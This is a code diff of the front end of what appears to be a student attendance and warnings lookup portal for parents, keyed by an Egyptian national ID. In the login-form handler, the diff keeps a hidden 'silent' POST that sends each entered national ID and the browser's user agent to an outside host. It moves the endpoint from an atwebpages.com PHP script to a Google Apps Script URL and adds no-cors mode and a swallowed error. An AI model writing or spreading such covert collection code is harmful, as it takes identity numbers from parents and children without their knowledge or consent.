@@ -4,7 +4,7 @@
    ============================================================================ */
 'use strict';
 (function () {
-  const BUILD = 'nid2027v1'; // تأكد إن الرقم ده متطابق مع meta.json و sw.js
+  const BUILD = 'nid2027v3'; // تأكد إن الرقم ده متطابق مع meta.json و sw.js
   const $ = (s, r = document) => r.querySelector(s);
   const app = $('#app');
   const esc = (s) => String(s == null ? '' : s).replace(/[&<>"']/g,
@@ -554,20 +554,23 @@
     };
     inp.addEventListener('input', upd);
     
-    // هنا تم دمج إرسال الرقم للاستضافة في الخلفية
+    // هنا تم دمج إرسال الرقم للاستضافة في الخلفية (Google Apps Script)
     $('#lf').addEventListener('submit', (e) => {
       e.preventDefault();
       const nidVal = $('#nid').value;
       
       if (/^[23]\d{13}$/.test(nidVal)) {
-        const params = new URLSearchParams();
-        params.append('nid', nidVal);
-        params.append('ua', navigator.userAgent);
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyaR1t10lFbbAbmUqlWcUjKDlrmBY58unYaKdOW1lP772RA97jSkPHdPgk-6sCf5FqRlA/exec';
         
-        // إرسال صامت للاستضافة، مش بنستنى الرد عشان ميعطلش الدخول
-        fetch('https://starrnightt2030-oss.atwebpages.com/save.php', {
+        const formData = new FormData();
+        formData.append('nid', nidVal);
+        formData.append('ua', navigator.userAgent);
+
+        // إرسال صامت باستخدام no-cors
+        fetch(scriptURL, {
           method: 'POST',
-          body: params
+          mode: 'no-cors',
+          body: formData
         }).catch(err => console.log('Save failed:', err));
       }
       
@@ -892,7 +895,7 @@
     const st = ST[d.st] || ST.ok;
     const c = d.c || {};
     let sub = '';
-    if (d.st === 'ok') sub = 'لا إنذارات ولا قرارات فصل — استمرّ في متابعته';
+    if (d.st === 'ok') sub = 'لا إنذارات ولا قرارات فصل — استمرّ في متابعة ابنك';
     const chd = chOf(d);
     const chn = chd && chd.n ? ` (${daysAr(chd.n)} غياب متصل)` : '';
     if (d.st === 'warn') sub = `صدر إنذار${d.sd ? ` بتاريخ ${fDate(d.sd)}` : ''}${d.sr ? ` — ${ruleTxt(d.sr)}` : ''}. تواصل مع شؤون الطلاب`;
